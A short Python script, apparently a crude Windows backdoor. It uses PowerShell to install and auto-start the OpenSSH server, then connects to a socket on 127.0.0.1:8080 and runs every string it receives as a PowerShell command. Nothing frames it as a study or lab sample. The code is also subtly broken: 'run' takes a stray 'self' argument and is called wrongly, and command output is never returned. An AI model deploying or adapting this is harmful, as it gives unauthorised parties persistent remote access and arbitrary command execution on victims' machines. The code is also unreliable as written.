import subprocess
import time
import socket
import sys
import os

#powershell script to enable SSH on windows

def run(self, cmd):
  
  completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
  return completed

commands = ["Get-WindowsCapability -Online | ? Name -like 'OpenSSH*'","Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0", "Start-Service sshd","Get-Service sshd","Set-Service -Name sshd -StartupType 'Automatic'"]                             

for x in commands:
  run(x)

  
  
##for later commands in powershell if needed
s = socket.socket()

host = "127.0.0.1"

port = 8080

s.connect((host, port))


while True:
    command = s.recv(1024)

    command = command.decode()
    
    def run(self, cmd):
      
      completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
      return completed
  
    run(command)




    
